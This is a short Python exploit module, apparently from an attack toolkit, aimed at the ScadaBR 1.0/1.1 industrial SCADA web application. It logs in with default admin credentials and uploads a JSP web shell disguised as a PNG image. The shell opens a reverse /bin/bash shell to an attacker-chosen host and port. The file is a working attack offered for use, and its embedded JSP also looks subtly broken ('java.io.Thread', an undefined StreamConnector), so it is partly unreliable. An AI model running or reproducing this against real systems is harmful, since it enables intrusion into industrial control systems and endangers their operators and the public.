import requests
from utils.logger import setup_logger
logger = setup_logger()

def exploit(target: str, port: int, user: str = "admin", pwd: str = "admin", lhost: str = "127.0.0.1", lport: int = 4444):
    """
    ScadaBR 1.0 / 1.1 CE â€“ Fellipe Oliveira
    """
    base = f"http://{target}:{port}/ScadaBR"
    sess = requests.Session()
    sess.post(f"{base}/login.htm", data={"username": user, "password": pwd}, timeout=5)

    shell = f"""<%@page import="java.lang.*,java.net.*"%><%Socket s=new Socket("{lhost}",{lport});Process p=Runtime.getRuntime().exec("/bin/bash");new java.io.Thread(new StreamConnector(s.getInputStream(),p.getOutputStream())).start();new java.io.Thread(new StreamConnector(p.getInputStream(),s.getOutputStream())).start();%>"""
    files = {"backgroundImageMP": ("shell.jsp", shell, "image/png")}
    up = sess.post(f"{base}/view_edit.shtm", files=files, data={"upload": "Upload image"}, timeout=10)
    if up.status_code == 200:
        logger.info("[+] ScadaBR JSP shell uploaded")
        return True
    return False